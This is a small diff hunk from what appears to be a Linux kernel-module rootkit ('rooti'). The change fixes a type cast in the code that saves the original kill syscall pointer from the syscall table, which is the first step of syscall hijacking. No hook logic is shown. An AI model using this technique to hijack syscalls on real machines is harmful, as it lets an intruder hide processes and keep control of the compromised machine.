@@ -104,7 +104,7 @@ static int rooti_store_kill(void)
     rooti_orig_kill = (rooti_ptregs_t)rooti_syscall_table[__NR_kill];
     printk(KERN_INFO "Original kill syscall sucessfully stored\n");
 #else
-    rooti_orig_kill = (orig_kill_t)rooti_syscall_table[__NR_kill];
+    rooti_orig_kill = (rooti_orig_kill_t)rooti_syscall_table[__NR_kill];
     printk(KERN_INFO "Original kill syscall sucessfully stored\n");
 #endif
 
